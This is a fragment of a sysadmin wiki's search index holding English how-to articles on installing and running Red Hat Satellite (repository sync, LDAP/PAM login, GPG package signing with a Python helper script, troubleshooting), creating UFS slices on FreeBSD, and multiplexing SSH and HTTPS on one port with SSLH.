10.254.239.0 netmask 255.255.255.224 { # range 10.254.239.10 10.254.239.20; # option routers rtr-239-0-1.deimos.fr, rtr-239-0-2.deimos.fr; #} # This declaration allows BOOTP clients to get dynamic addresses, # which we don't really recommend. #subnet 10.254.239.32 netmask 255.255.255.224 { # range dynamic-bootp 10.254.239.40 10.254.239.60; # option broadcast-address 10.254.239.31; # option routers rtr-239-32-1.deimos.fr; #} # A slightly different configuration for an internal subnet. #subnet 10.5.5.0 netmask 255.255.255.224 { # range 10.5.5.26 10.5.5.30; # option domain-name-servers ns1.internal.deimos.fr; # option domain-name \"internal.deimos.fr\"; # option routers 10.5.5.1; # option broadcast-address 10.5.5.31; # default-lease-time 600; # max-lease-time 7200; #} # Hosts which require special configuration options can be listed in # host statements. If no address is specified, the address will be # allocated dynamically (if possible), but the host-specific information # will still come from the host declaration. #host passacaglia { # hardware ethernet 0:0:c0:5d:bd:95; # filename \"vmunix.passacaglia\"; # server-name \"toccata.fugue.com\"; #} # Fixed IP addresses can also be specified for hosts. These addresses # should not also be listed as being available for dynamic assignment. # Hosts for which fixed IP addresses have been specified can boot using # BOOTP or DHCP. Hosts for which no fixed address is specified can only # be booted with DHCP, unless there is an address range on the subnet # to which a BOOTP client is connected which has the dynamic-bootp flag # set. # You can declare a class of clients and then do address allocation # based on that. The example below shows a case where all clients # in a certain class get addresses on the 10.17.224/24 subnet, and all # other clients get addresses on the 10.0.29/24 subnet. #class \"foo\" { # match if substring (option vendor-class-identifier, 0, 4) = \"SUNW\"; #} #shared-network 224-29 { # subnet 10.17.224.0 netmask 255.255.255.0 { # option routers rtr-224.deimos.fr; # } # subnet 10.0.29.0 netmask 255.255.255.0 { # option routers rtr-29.deimos.fr; # } # pool { # allow members of \"foo\"; # range 10.17.224.10 10.17.224.250; # } # pool { # deny members of \"foo\"; # range 10.0.29.10 10.0.29.230; # } #} Then I’ll declare the interfaces on which the dhcpd service should listen:\n# Command line options here DHCPDARGS=\"eth1 eth2\"; As I mentioned above, I have one interface per range, so we’ll add the appropriate routes:\nADDRESS1=10.102.2.32 NETMASK1=255.255.255.224 GATEWAY1=10.102.2.63 ADDRESS2=10.102.2.64 NETMASK2=255.255.255.224 GATEWAY2=10.102.2.94 Then I restart the service:\nservice restart dhcpd Configuration linkConfiguring the proxy on Satellite (Only for installation in disconnected mode) linkIf you installed with the ‘–disconnected’ option, you’ll need to edit the /etc/rhn/rhn.conf file to add or edit the following lines:\nserver.satellite.rhn_parent = satellite.rhn.redhat.com server.satellite.http_proxy = : server.satellite.http_proxy_username = server.satellite.http_proxy_password = Obviously, you only use the last three lines if you are behind a proxy.\nThen we need to reactivate the satellite in connected mode:\n\u003e rhn-satellite-activate --rhn-cert=/root/deimos.cert RHN_PARENT: satellite.rhn.redhat.com Before going further, make sure your system is up to date using ‘yum update’.\nSynchronizing/Adding a repository locally linkWe’ll start one of the longest operations during Satellite installation, namely downloading repositories locally. For this, you have 2 methods:\nMethod 1 linkDownload everything:\nsatellite-sync Method 2 linkDownload only certain Satellite versions: First, let’s display the available repositories:\n\u003e satellite-sync -l 16:28:41 Red Hat Network Satellite - live synchronization 16:28:41 url: https://satellite.rhn.redhat.com 16:28:41 debug/output level: 1 16:28:42 db: rhnsat/@rhnsat 16:28:42 16:28:42 Retrieving / parsing channel-families data 16:28:46 channel-families data complete 16:28:48 16:28:48 Retrieving / parsing channel data 16:29:51 p = previously imported/synced channel 16:29:51 . = channel not yet imported/synced 16:29:51 base-channels: 16:29:51 . jb-middleware 0 16:29:51 . jbdevstudio-1-linux 0 ... 16:29:59 . solaris-sparc-9-rhdirserv-7.1 0 16:29:59 . solaris-sparc-9-rhdirserv-7.1-beta 0 16:29:59 . solaris-sparc-9-rhdirserv-8 0 16:29:59 . solaris-sparc-9-rhdirserv-8-beta 0 16:29:59 Import complete: Begin time: Sat Feb 25 16:28:41 2012 End time: Sat Feb 25 16:29:59 2012 Elapsed: 0 hours, 1 minutes, 17 seconds And we’ll select the ones we’re interested in:\n\u003e satellite-sync -c rhel-x86_64-server-6 -c rhn-tools-rhel-x86_64-server-6 -c rhel-x86_64-server-5 -c rhn-tools-rhel-x86_64-server-5 11:47:15 Red Hat Network Satellite - live synchronization 11:47:15 url: https://satellite.rhn.redhat.com 11:47:15 debug/output level: 1 11:47:16 db: rhnsat/@rhnsat 11:47:16 11:47:16 Retrieving / parsing channel-families data 11:47:20 channel-families data complete 11:47:22 11:47:22 Retrieving / parsing arches data 11:47:23 arches data complete 11:47:23 11:47:23 Retrieving / parsing additional arches data 11:47:24 additional arches data complete 11:47:24 11:47:24 Retrieving / parsing channel data 11:48:31 p = previously imported/synced channel 11:48:31 . = channel not yet imported/synced 11:48:31 base-channels: 11:48:31 p rhel-x86_64-server-5 12409 11:48:31 p rhel-x86_64-server-6 6740 11:48:31 11:48:31 Channel data complete 11:48:31 11:48:31 Retrieving / parsing blacklists data 11:48:32 blacklists data complete 11:48:32 11:48:32 Retrieving / parsing product names data 11:48:33 product names data complete 11:48:33 11:48:33 Retrieving short package metadata (used for indexing) 11:48:33 Retrieving / parsing short package metadata: rhel-x86_64-server-5 (12409) 11:48:42 Retrieving / parsing short package metadata: rhel-x86_64-server-6 (6740) 11:48:47 Diffing package metadata (what's missing locally?): rhel-x86_64-server-5 ________________________________________ Diffing: ######################################## - complete 11:48:56 Diffing package metadata (what's missing locally?): rhel-x86_64-server-6 ________________________________________ Diffing: ######################################## - complete 11:49:01 11:49:01 Downloading package metadata 11:49:02 Retrieving / parsing *relevant* package metadata: rhel-x86_64-server-5 (NONE RELEVANT) 11:49:02 Retrieving / parsing *relevant* package metadata: rhel-x86_64-server-6 (3390) 11:49:02 * WARNING: this may be a slow process. ________________________________________ Downloading:################### ... The rhn-tools will be used for kickstarts.\nDeleting a repository linkTo delete a repository:\nspacewalk-remove-channel -c --unsubscribe spacewalk-remove-channel: enter here the name of the channel you want to unsubscribe from unsubscribe: allows you to remove the registration of all machines that are attached to this repository Integrating Satellite into a LDAP environment linkInstalling packages linkWe’ll need to install the PAM modules. On Red Hat, there’s not much to install:\nyum install nss-pam-ldapd Then install this package to integrate with Satellite:\nyum install pam-devel Configuring LDAP with PAM linkTo configure PAM with LDAP, use this command and adapt it to your needs:\nauthconfig --enableldap --enableldapauth --ldapserver=ldap://**openldap-server.deimos.fr:389** --ldapbasedn=\"**dc=openldap,dc=deimos,dc=fr**\" --enableldaptls --ldaploadcacer=**http://serveur-web/deimosfr.crt** --enablemkhomedir --update –ldapserver: enter your web server address –ldapbasedn: your server’s DN –enableldaptls: if you use secure LDAP connections –ldaploadcacer: the certificate to use (if you have no way to retrieve it this way, see the procedure below) or a version without ssl/tls:\nauthconfig --enableldap --enableldapauth --disablenis --disableshadow --enablecache --passalgo=sha512 --disableldaptls --disableldapstarttls --disablesssdauth --enablemkhomedir --enablepamaccess --enablecachecreds --enableforcelegacy --disablefingerprint --ldapserver=192.168.0.1 --ldapbasedn=dc=openldap,dc=deimos,dc=fr --updateall To retrieve the ssl certificate requested above, here’s a solution:\n\u003e openssl s_client -connect openldap-server.deimos.fr:636 CONNECTED(00000003) depth=0 C = FR, ST = IDF, L = Paris, O = DEIMOS, CN = openldap-server.deimos.fr, emailAddress = deimos@deimos.fr verify error:num=18:self signed certificate verify return:1 depth=0 C = FR, ST = IDF, L = Paris, O = DEIMOS, CN = openldap-server.deimos.fr, emailAddress = deimos@deimos.fr verify return:1 --- Certificate chain 0 s:/C=FR/ST=IDF/L=Paris/O=DEIMOS/CN=openldap-server.deimos.fr/emailAddress=deimos@deimos.fr i:/C=FR/ST=IDF/L=Paris/O=DEIMOS/CN=openldap-server.deimos.fr/emailAddress=deimos@deimos.fr --- Server certificate -----BEGIN CERTIFICATE----- MIIDpTCCAw6gAwIBAgIJAJJUJLhNM1/XMA0GCSqGSIb3DQEBBQUAMIGUMQswCQYD VQQGEwJGUjEMMAoGA1UECBMDSURGMQ4wDAYDVQQHEwVQYXJpczEPMA0GA1UEChMG VUxMSU5LMREwDwYDVQQLEwh1bHN5c25ldDEcMBoGA1UEAxMTdGFzbWFuaWEMdWxs aW5rLmxhbjElMCMGCSqGSIb3DQEJARYWaW503XJuYWwtaXRAdWxsaW5rLmNvbTAe Fw0xMTEyMDUxMjQzMzVaFw0yMTEyMDIxMjQzMzVaMIGUMQswCQYDVQQGEwJGUjEM MAoGA1UECBMDSURGMR4wDAYDVQQHEwVQYXJpczEPMA0GA1UEChMGVUxMSU5LMREw DwYDVQQLEwh1bHN5c25ldDEcMBoGA1UEAxMTdGFzbWFuaWEudWxsaW5rLmxhbjEl MCMGCSqGSIb3DQEJARYWaW50ZXJuYWwtaXRAdWxsaW5rLmNvbTCBnzANBgkqhkiG 9w0BAQEFAAOBjQAwgYkCgYEA4QoXFn39LhMW7mlA9r3NOX6iTHCCSlZjVQi0mQ5k BVysN8KMFfC0E4vOeG1Z11AYwW7xCOb4Pl+LgfgfdgfgfdJIn92LX0meJcsgWKOh qVAsZNkWn2ss8oDw3t5NEOjKFZ5BKVR2fL4Yj23DmFOAwew5PR5xhxGV5LJ9VErS Ks0CAwEAAaOB/DCB+TAdBgNVHQ4EFgQUn5Ig2hFtROXcG3vxux7izNqcUd4wgckG A1UdIwSBwTCBvoAUn5Ig2hFtROXcG3vxux7izNqcUd6hgZqkgZcwgZQxCzAJBgNV BAYTAkZSMQwwCgYDVQQIEwNJREYxDjAMBgNVBAcTBVBhcmlzMQ8wDQYDVQQKEwZV TExJTksxETAPBgNVBAsTCHVsc3lzbmV0MRwwGgYDVQQDExN0YXNtYW5pYS51bGxp bmsubGFuMSUwIwYJKoZIhvcNAQkBFhZpbnRlcm5hbC1pdEB1bGxpbmsuY29tggkA klQkuE0zX9cwDAYCVR0TBAUwAwEB/zANBgkqhkiG9w0BAQUFAAOBgQAbjjAbcBez dKyq+Tlf3/DURW0BJhHKyY7UW7L39m/KZRIB2lbgFjslrAL4yNnFgipJ6aKlJFfV BYEu7MhKH2pJZBYFpzuHOdKvDq+Kmn/wGvxeOvzh1GzQPGhQv4cClm2PJNMh/jrK ZWNzqyLWYtWAoLu6N6gMER1Bd1Z5uzHl3A== -----END CERTIFICATE----- subject=/C=FR/ST=IDF/L=Paris/O=DEIMOS/CN=openldap-server.deimos.fr/emailAddress=deimos@deimos.fr issuer=/C=FR/ST=IDF/L=Paris/O=DEIMOS/CN=openldap-server.deimos.fr/emailAddress=deimos@deimos.fr --- No client certificate CA names sent --- SSL handshake has read 1291 bytes and written 311 bytes --- New, TLSv1/SSLv3, Cipher is AES256-SHA Server public key is 1024 bit Secure Renegotiation IS NOT supported Compression: NONE Expansion: NONE SSL-Session: Protocol : TLSv1 Cipher : AES256-SHA Session-ID: 91E6398F6DE9FBDC1B7EBDF890FE818B09EB79555C9FC1CF64EDC284F7A23B2A Session-ID-ctx: Master-Key: 51408932336792F4E8F5339BD12F312005022A4B20E6A5FBC56239BC0DD514344449531973B9A8395B1E799196D8F411 Key-Arg : None Krb5 Principal: None PSK identity: None PSK identity hint: None Start Time: 1327491823 Timeout : 300 (sec) Verify return code: 18 (self signed certificate) --- If the certificate is retrieved manually, copy it to /etc/openldap/cacerts/ldap.crt, then run the following command:\ncacertdir_rehash /etc/openldap/cacerts Configuring LDAP on Satellite linkWe’ll insert this into the /etc/rhn/rhn.conf file:\npam_auth_service = rhn-satellite Finally, provide this information:\n#%PAM-1.0 auth required /lib64/security/pam_env.so auth sufficient /lib64/security/pam_ldap.so no_user_check auth required /lib64/security/pam_deny.so account required /lib64/security/pam_ldap.so no_user_check #account required /lib64/security/pam_access.so I commented out the pam*access part which allows increasing account security. For more information on this module (pam_access) read this documentation.\nThen restart the Satellite services to see the user creation options:\nrhn-satellite restart A new checkbox will appear in the user creation section:\nUse PAM to authenticate via LDAP, Kerberos, and other network-based authentication systems. Note: The password fields above are not required when this box is checked; however, you can enter a password that will only work when PAM authentication for this user's account is disabled. Usage linkCreating the admin account linkTo connect to the web interface, it’s very simple, go to HTTPS on your server (https://satellite-master):\nThen fill in the information and click “Create Account”.\nConfiguring the timezone linkTo configure the timezone, it’s done in the graphical interface:\nAdding a custom repository linkCreate your repository in the “Custom Channels” and set the Red Hat version as parent if you want to add additional packages and keep the standard packages available on Red Hat.\nPrerequisites (GPG) linkWe’ll need to generate a GPG key to sign our packages:\n\u003e gpg --gen-key gpg (GnuPG) 2.0.14; Copyright (C) 2009 Free Software Foundation, Inc. This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. Select the type of key you want: (1) RSA and RSA (default) (2) DSA and Elgamal (3) DSA (signature only) (4) RSA (signature only) Your choice? 1 So we’ll choose the first option.\nThen generate the default key size without expiration:\nRSA keys may be between 1024 and 4096 bits long. What keysize do you want? (2048) Requested keysize is 2048 bits Specify how long the key should be valid. 0 = key does not expire = key expires in n days w = key expires in n weeks m = key expires in n months y = key expires in n years How long is the key valid for? (0) Key doesn't expire at all Is this correct? (y/N) y Enter your information for package signing:\nYou need a user ID to identify your key; the software constructs the user ID from the Real Name, Comment and Email Address in this form: \"Heinrich Heine (Der Dichter) \" Real name: Deimos FR Email address: deimos@deimos.fr Comment: You selected this USER-ID: \"Deimos \" Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o You need a passphrase to protect your secret key. can't connect to `/root/.gnupg/S.gpg-agent': No such file or directory gpg-agent[25522]: directory `/root/.gnupg/private-keys-v1.d' created Then enter a passphrase, and the key validity:\n/-----------------------------------------------------\\ | Please re-enter this passphrase | | | | Passphrase ________________________________________ | | | | | \\-----------------------------------------------------/ Specify how long the key should be valid. 0 = key does not expire = key expires in n days w = key expires in n weeks m = key expires in n months y = key expires in n years How long is the key valid for? (0) Key doesn't expire at all Is this correct? (y/N) y The key is created and you are given the key ID:\nCan't connect to `/root/.gnupg/S.gpg-agent': No such file or directory A large number of random bytes need to be generated. You should do something else (type on the keyboard, move the mouse, use the disks) during the generation of prime numbers; this gives the random number generator a better chance of gathering enough entropy. gpg: key DFC7E56C marked as ultimately trusted. public and secret key created and signed. gpg: checking the trustdb gpg: 3 marginal(s) needed, 1 complete(s) needed, PGP trust model gpg: depth: 0 valid: 1 signed: 0 trust: 0-, 0q, 0n, 0m, 0f, 1u pub 2048R/DFC7E56A 2012-03-12 Key fingerprint = 4EC2 939F 3986 96CE 826C 665A 83D7 D404 DFC7 E56D uid Deimos FR sub 2048R/4425ACDD 2012-03-12 The key is now created, and we can sign our packages with it.\nWe can list our keys at any time like this:\ngpg --list-keys To export our newly created public key:\ngpg --export -a 'Deimos fr' \u003e /etc/pki/rpm-gpg/RPM-GPG-KEY-deimos This key will be used to deploy packages for all our future clients.\nTo help us with bulk package signing, we’ll create a small preferences file:\n%_signature gpg %_gpg_name DFC7E56A Replace the value of ‘%_gpg_name’ with your key ID.\nNow we’ll declare our new key in Satellite at the kickstart level so our automated installations have this key present:\nAnd finally the custom repository must contain the GPG information:\nAdding packages linkIf you want to add packages to a repository (e.g.: repo-test), temporarily download the RPM(s) you’re interested in on the satellite server:\nwget http://dl.fedoraproject.org/pub/epel/6/x86_64/tmux-1.5-1.el6.x86_64.rpm We’ll sign this package:\n\u003e rpm --resign tmux-1.5-1.el6.x86_64.rpm Enter passphrase: Pass phrase is good. Then add this RPM to your custom repository:\n\u003e rhnpush -c repo-test tmux-1.5-1.el6.x86_64.rpm Red Hat Network username: deimos Red Hat Network password: -c repo-test: -c allows you to specify the repository where you want to put this package. Now you need to update the package list in the web interface so clients can see them:\nNow, on the client, you just need to do:\nyum clean all yum install tmux Automating and simplifying package signing and adding linkIf you don’t want to have to constantly type your credentials, passphrase etc… every time you set up new packages, I created a small Python tool to save time:\n#!/usr/bin/env python # Made by Pierre Mavro 14/03/2012 # Version : 0.1 # This script permit to automate in a non secure way, new packages for a custom repository on Red Hat Satellite # Require : pexpect import getopt, os, sys, glob, pexpect from string import Template # Help cmd_name = sys.argv[0] def help(code): print cmd_name, \"[-h] [-r] [-s] [-l] [-p] [-d]\" str = \"\"\" -h, --help Show this help -s, --passphrase Passphrase to sign packages -r, --repository Select wished repository to push the packages -l, --login Red Hat Network username -p, --password Red Hat Network password -f, --folder folder were new packages should be added (default: /tmp/packages) -d, --debug Debug mode \"\"\" print str sys.exit(code) class bcolors: OK = '\\033[92m' FAIL = '\\033[91m' END = '\\033[0m' def disable(self): self.OK = '' self.FAIL = '' self.END = '' # Sign and push function def sign_push(passphrase,repository,login,password,folder,debug): # Package signing def sign(rpm_files,passphrase,folder,debug,charspacing): if (debug == 1): print 80*'=' + \"\\n\" print '[+] Signing packages :' # Sign all packages for package in rpm_files: # Formating charspace = Template(\"{0:\u003c$space}\") print charspace.substitute(space = charspacing).format(' - ' + package + '...'), # Launch resign child = pexpect.spawn('rpm --resign ' + package) if (debug == 1): child.logfile = sys.stdout child.expect ('Enter pass phrase|Entrez la phrase de passe') child.sendline (passphrase) if (debug == 1): child.logfile = sys.stdout child.expect(pexpect.EOF) child.close() # Check return status if (child.exitstatus == 0): print '[ ' + bcolors.OK + 'OK' + bcolors.END + ' ] ' else: print '[ ' + bcolors.FAIL + 'FAIL' + bcolors.END + ']' # Package push def push(rpm_files,repository,login,password,folder,debug,charspacing): if (debug == 1): print 80*'=' + \"\\n\" print '[+] Adding packages to satellite server :' for package in rpm_files: # Formating charspace = Template(\"{0:\u003c$space}\") print charspace.substitute(space = charspacing).format(' - ' + package + '...'), # RPM push command child = pexpect.spawn('rhnpush --force --no-cache -c ' + repository + ' ' + package) if (debug == 1): child.logfile = sys.stdout child.expect ('Red Hat Network username') child.sendline (login) child.expect ('Red Hat Network password') child.sendline (password) if (debug == 1): child.logfile = sys.stdout child.expect(pexpect.EOF) child.close() # Check return status if (child.exitstatus == 0): print '[ ' + bcolors.OK + 'OK' + bcolors.END + ' ] ' else: print '[ ' + bcolors.FAIL + 'FAIL' + bcolors.END + ' ]' # Get rpm files list rpm_files=glob.glob(folder + '/*.rpm') if (debug == 1): print 80*'=' + \"\\n\" + 'RPM found :' if (debug == 1): print rpm_files # Check if RPM were found if (len(rpm_files) == 0): print \"No RPM were found in \" + folder sys.exit(2) # Get maximum rpm size for visual answers (OK/FAIL) charspacing=0 for package in rpm_files: count = len(package) if (count \u003e charspacing): charspacing=count charspacing += 10 # Sign packages sign(rpm_files,passphrase,folder,debug,charspacing) # Push packages push(rpm_files,repository,login,password,folder,debug,charspacing) # Main def main(argv): try: opts, args = getopt.getopt(argv, 'hs:r:l:p:f:d', [\"passphrase=\",\"repository=\",\"login=\",\"password=\",\"folder=\",\"help\"]) except getopt.GetoptError: # Print help and exit print \"Unknow option, bad or missing argument\\n\" help(2) # Initialize vars # GPG passphrase for package sign in passphrase=None repository=None login=None password=None folder='/tmp/' debug=0 # Check opts for opt, arg in opts: if opt in (\"-h\", \"--help\"): help(0) sys.exit(0) elif opt in (\"-s\", \"--passphrase\"): passphrase = str(arg) elif opt in (\"-r\", \"--repository\"): repository=str(arg) elif opt in (\"-l\", \"--login\"): login=str(arg) elif opt in (\"-p\", \"--password\"): password=str(arg) elif opt in (\"-f\", \"--folder\"): folder=str(arg) elif opt in (\"-d\", \"--debug\"): debug=1 else: print \"Unknow option, please see usage\\n\" help(2) # Checks if (passphrase or repository or login or password) is None: print \"Unknow option, please see usage\\n\" help(2) sign_push(passphrase,repository,login,password,folder,debug) if __name__ == \"__main__\": main(sys.argv[1:]) You can run it either by hardcoding the necessary information in the code in the ‘Initialize vars’ section, or by using arguments:\n\u003e satellite_add_packages.py -s -r -f -l -p [+] Signing packages : - /root/done/tmux-1.5-1.el6.x86_64.rpm... [ OK ] [+] Adding packages to satellite server : - /root/done/tmux-1.5-1.el6.x86_64.rpm... [ OK ] Client linkIn this section, we’ll see how clients can communicate with our satellite server.\nRegistration linkTo register a machine in your satellite server that was not deployed via kickstart, run this command to register it:\nrhn-register Then, the Satellite server information will be requested.\nUpdating the profile linkIf you make changes to the machine’s profile (hardware, hostname…), you can update it from the guest machine using this command:\nrhn-profile-sync Re-registering a machine linkFor various reasons, you may want to re-register a machine. It’s very simple - you need to remove the current references to the satellite, then restart the registration:\nrm -f /etc/sysconfig/rhn/systemid rhn-register Crontab for updates linkSatellite synchronizations can take a lot of time. That’s why it’s recommended to update as much as possible, so add this to your crontab:\n0 1 * * * perl -le 'sleep rand 9000' \u0026\u0026 satellite-sync --email \u003e/dev/null 2\u003e1 FAQ linkRestarting the installation linkIf you want to restart the installation at any time, you can do it with the –skip-db-install option, because generally, the database installation operation went well, but not necessarily the rest:\ninstall.pl --skip-db-install There are many other options with ‘–help’.\nLogs linkWhen there’s an error, for uploading a package or otherwise, there are many logs to check. I’ll try to describe the method to follow:\nFirst thing to do is to check the apache logs: /var/log/httpd/error_log If there’s still not enough info, look in the /var/log/rhn/ folder. It’s well organized and you can quickly find the desired information. “Error validating satellite certificate” error during RHN Satellite install linkIf you have this problem, it’s likely because you’re behind a proxy or don’t yet have an internet connection. You’ll need to restart the installation:\n/home/sat/install.pl --disconnected --skip-db-install Tomcat failed to start properly or the installer ran out of tries. Please check /var/log/tomcat*/catalina.out for errors linkIf you have this type of message, it’s because the hostname is incorrectly configured. To fix this problem, check that this section is correctly filled in, then restart the installer like this:\nspacewalk-hostname-rename x.x.x.x Validating IP ... OK ============================================= hostname: satellite-master.deimos.fr ip: x.x.x.x ============================================= Stopping rhn-satellite services ... OK Testing DB connection ... OK Updating /etc/rhn/rhn.conf ... OK Actual SSL key pair package: rhn-org-httpd-ssl-key-pair-satellite-master-1.0-1.noarch No need to re-generate SSL certificate. Regenerating new bootstrap client-config-overrides.txt ... OK Updating NOCpulse.ini ... OK Updating monitoring data ... OK Updating other DB entries ... OK Changing cobbler settings ... OK Changing jabberd settings ... OK Starting rhn-satellite services ... OK If all is well, you’ll see OK everywhere :-)\nERROR: Server not registered? No systemid: /etc/sysconfig/rhn/systemid linkIf you have this kind of message when activating a satellite:\n\u003e rhn-satellite-activate --rhn-cert=/root/deimos.cert RHN_PARENT: satellite.rhn.redhat.com ERROR: Server not registered? No systemid: /etc/sysconfig/rhn/systemid It’s likely because you have an internet access problem. Or, your machine needs to be registered again:\nrhn-register Add the ‘–proxy=proxy:port’ option with the correct values if you’re behind a proxy.\nunable to extend index RHNSAT.RHN_ERRATAFILE_EID_FILE_IDX by 128 in tablespace DATA_TBS linkIf you get this type of error message during a satellite sync:\n... SYNC ERROR: unhandled exception occurred: (Check logs/email for potentially more detail) (54, 'ORA-01654: unable to extend index RHNSAT.RHN_ERRATAFILE_EID_FILE_IDX by 128 in tablespace DATA_TBS\\n', '\\n Package Upload Failed due to uniqueness constraint violation.\\n Make sure the package does not have any duplicate dependencies or\\n does not alre It means you’re at 100% utilization of your Oracle database. First check your disk space size. If all is ok, let’s verify that we’re out of space:\n\u003e su - oracle -c \"db-control report\" Tablespace Size Used Avail Use% DATA_TBS 3.9G 3.9G 0M 100% SYSAUX 500M 84.3M 415.6M 17% SYSTEM 400M 245.3M 154.6M 61% TEMP_TBS 1000M 0B 1000M 0% UNDO_TBS 1000M 96.3M 903.6M 10% USERS 128M 64K 127.9M 0% Indeed, we’re out of space and we’ll need to increase the size of the DATA_TBS table by 500Mib:\n\u003e su - oracle -c \"db-control extend DATA_TBS\" Extending DATA_TBS... done. Then we’ll check the data again to verify it’s good:\n\u003e su - oracle -c \"db-control report\" Tablespace Size Used Avail Use% DATA_TBS 4.3G 3.9G 502.8M 89% SYSAUX 500M 84.3M 415.6M 17% SYSTEM 400M 245.3M 154.6M 61% TEMP_TBS 1000M 0B 1000M 0% UNDO_TBS 1000M 96.3M 903.6M 10% USERS 128M 64K 127.9M 0% All is ok, we can restart the satellite-sync command.\ncould not find kernel image: menu linkI don’t know if it’s a bug with the Satellite server, or if I forgot something, but the menu.c32 file is not in the right place and PXE clients refuse to boot. So to fix the problem:\ncp /usr/share/syslinux/menu.c32 /var/lib/tftpboot/ warning: rpmts_HdrFromFdno: Header V4 RSA/SHA1 Signature, key ID linkYou might have this kind of message:\nwarning: rpmts_HdrFromFdno: Header V4 RSA/SHA1 Signature, key ID dfc7eded: NOKEY Public key for tmux-1.5-1.el6.x86_64.rpm is not installed To solve this problem, you need to create GPG keys and sign your packages.\nerror was [Errno -1] Package does not match intended download linkIf you have this kind of message on the client side during a yum:\nError Downloading Packages: puppet-2.7.9-2.el6.noarch: failed to retrieve getPackage/puppet-2.7.9-2.el6.noarch.rpm from custom-repo error was [Errno -1] Package does not match intended download. Suggestion: run yum --enablerepo=deimos-repo clean metadata You need to clear your cache and try again:\nrm -rf /var/cache/yum/* yum clean all Resources linkhttps://access.redhat.com/kb/docs/DOC-34410\n"
            }
        );
    index.add(
            {
                id:  319 ,
                href: "\/UFS_:_utilisation_des_disques_en_UFS\/",
                title: "UFS: Disk usage in UFS",
                description: "A guide on how to create and manage UFS slices in FreeBSD, including partition creation, formatting, and mounting.",
                content: " Operating System FreeBSD 9 Website FreeBSD Website Last Update 14/06/2012 Introduction linkToday with BTRFS and ZFS, it’s super simple to create and delete partitions, etc., but with UFS (the old way), it’s less obvious, although not very complicated. I’ll talk about some common practices here :-)\nCreating a slice linkFirst, let’s display the content of our disk:\n\u003e gpart show ada0 =\u003e 34 976773101 ada0 GPT (465G) 34 128 1 freebsd-boot (64k) 162 41943040 2 freebsd-ufs (20G) 41943202 924843904 - free - (441G) 966787106 8388608 3 freebsd-swap (4.0G) 975175714 1597421 - free - (780M) Here we can see I have 3 slices. The idea is to add a slice (for backup needs, so we’ll call it backups) on this GPT partition table. I specify this because we’re going to use the gpt command and not fdisk! Let’s add 50G:\n\u003e gpart add -t freebsd-ufs -l backups -s 50G ada0 ada0p4 added And if we display it now:\n\u003e gpart show ada0 =\u003e 34 976773101 ada0 GPT (465G) 34 128 1 freebsd-boot (64k) 162 41943040 2 freebsd-ufs (20G) 41943202 104857600 4 freebsd-ufs (50G) 146800802 819986304 - free - (391G) 966787106 8388608 3 freebsd-swap (4.0G) 975175714 1597421 - free - (780M) Oh yeah! Now we just need to format it as UFS:\n\u003e newfs -U /dev/gpt/backups /dev/gpt/backups: 51200.0MB (104857600 sectors) block size 32768, fragment size 4096 [...] And mount it:\nmount /dev/gpt/backups /mnt/ If we want persistence, we need to add a line in fstab:\n# Device Mountpoint FStype Options Dump Pass# /dev/ada0p3 none swap sw 0 0 /dev/ada0p2 / ufs rw 1 1 /dev/ada0p4 /mnt ufs rw 2 2 References linkhttp://www.wonkity.com/~wblock/docs/html/disksetup.html\n"
            }
        );
    index.add(
            {
                id:  320 ,
                href: "\/SSLH:_Multiplexer_les_connections_SSL_et_SSH_sur_le_m%C3%AAme_port\/",
                title: "SSLH: Multiplexing SSL and SSH connections on the same port",
                description: "How to configure SSLH to multiplex SSL and SSH connections on the same port to allow both HTTPS and SSH traffic through a single port.",
                content: "Introduction linkSSLH is like a magic trick. It allows you, for example, to have both HTTPS and SSH on a WAN address on port 443. How is this possible? Can we have a single listening port for multiple services?\nIndeed! You just need to see SSLH as a layer 7 proxy capable of filtering and differentiating between SSL frames and SSH frames.\nInstallation linkDebian linkOn Debian, it’s an easy move:\naptitude install sslh FreeBSD linkFor installation on FreeBSD:\npkg_add -vr sslh OpenBSD linkOn OpenBSD for version 1.7:\nwget http://www.rutschle.net/tech/sslh-1.7a.tar.gz tar -xzvf sslh-1.7a.tar.gz cd sslh-1.7a cc -o sslh -DLIBWRAP sslh.c -lwrap cp sslh /usr/local/sbin For the latest versions:\nwget http://www.rutschle.net/tech/sslh-1.10.tar.gz tar -xzvf sslh-1.10.tar.gz cd sslh-1.10 make make install Note: With the latest versions, you’ll end up with 2 binaries: sslh-fork and sslh-select. sslh-select is for a single thread while sslh-fork is multi-threaded.\nConfiguration linkDebian linkIf you’re on Debian, it’s simple. Create a file in /etc/default/sslh with the following content:\nLISTEN=ifname:443 SSH=localhost:22 SSL=localhost:443 LISTEN: This is the IP of the interface and the listening port of SSLH. It must be the input listening port (WAN for example), the one through which your clients will pass. SSH: The address and port corresponding to your SSH port SSL: The address and port corresponding to your HTTPS port FreeBSD linkTo configure SSLH, just add these lines to rc.conf:\n# SSLH sslh_enable=\"YES\" sslh_mode=\"select\" # sslh_fib=\"NONE\" sslh_pidfile=\"/var/run/sslh/sslh.pid\" sslh_ssltarget=\"websrv:443\" sslh_sshtarget=\"localhost:22\" sslh_sshtimeout=\"2\" sslh_listening=\"192.168.0.254:443\" sslh_uid=\"nobody\" OpenBSD linkOn OpenBSD, I chose to add these lines to /etc/rc.local with my configuration directly in the command line:\nif [ -x /usr/local/sbin/sslh ] ; then # Versions \u003c 1.7a /usr/local/sbin/sslh -p -s -l # Versions \u003e= 1.10 /usr/local/sbin/sslh -P /tmp/sslh.pid -p --ssh --ssl echo 'SSLH' fi Again, adapt these lines according to your needs.\npfSense linkOn pfSense, we’ll create an init-like file:\n#!/bin/sh sslh_listen_ip= sslh_listen_port= ssh_redirect_ip= ssh_redirect_port= ssl_redirect_ip= ssl_redirect_port= rc_start() { /sbin/sslh-fork -P /tmp/sslh.pid -p $sslh_listen_ip:$sslh_listen_port --ssh $ssh_redirect_ip:$ssh_redirect_port --ssl $ssl_redirect_ip:$ssl_redirect_port \u0026 } rc_stop() { /usr/bin/killall sslh-fork } case $1 in start) rc_start ;; stop) rc_stop ;; restart) rc_stop rc_start ;; esac Adapt the beginning of the script with your desired information.\nThen set the appropriate permissions:\nchmod +x /usr/local/etc/rc.d/sslh.sh FAQ linkI have Zombie sslh processes on OpenBSD linkI’ve experienced zombie processes with each connection attempt to the SSH server. To fix this issue, here’s a patch for version 0.7:\n462a463,464 \u003e if (fork() \u003e 0) exit(0); /* Detach */ \u003e 467,468d468 \u003c if (fork() \u003e 0) exit(0); /* Detach */ \u003c "
            }
        );
